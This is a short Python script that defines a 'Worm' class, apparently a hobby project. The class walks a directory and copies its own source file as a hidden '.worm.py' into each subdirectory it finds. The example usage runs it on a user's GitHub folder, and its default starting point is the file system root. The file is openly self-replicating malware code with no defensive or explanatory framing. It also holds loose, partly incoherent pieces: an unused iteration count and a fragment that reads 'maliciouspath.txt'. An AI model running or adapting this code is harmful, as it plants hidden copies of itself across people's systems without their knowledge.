import os
import shutil
from pathlib import Path


class Worm:
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        self.path = path if path is not None else "/"
        self.target_dir_list = target_dir_list if target_dir_list is not None else []
        self.iteration = iteration if iteration is not None else 1000000
        self.own_path = __file__  # Set this to the path of the current script

    def display_path(self): 
        print(self.path)
    
    def list_directories(self, path):
        self.target_dir_list.append(path)
        try:
            files_in_current_directory = os.listdir(path)
            for file in files_in_current_directory:
                if not file.startswith('.'):
                    absolute_path = os.path.join(path, file)
                    print(absolute_path)
                    if os.path.isdir(absolute_path):
                        self.target_dir_list.append(absolute_path)
        except FileNotFoundError as e:
            print(f"Error: {e}")
            self.target_dir_list.append(path)

    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".worm.py")
            try:
                shutil.copyfile(self.own_path, destination)
            except Exception as e:
                print(f"Failed to copy worm to {directory}: {e}")

# Example Usage
worm = Worm(path="C:/Users/pfore736/Documents/GitHub/Evit/worm")  # Set a valid directory
worm.list_directories(worm.path)
worm.create_new_worm()

# Additional functionality for Path and pGerm
pGerm = Path('maliciouspath.txt')
try:
    contents = pGerm.read_text().rstrip()
    print(contents)
except FileNotFoundError as e:
    print(f"Error: {e}")
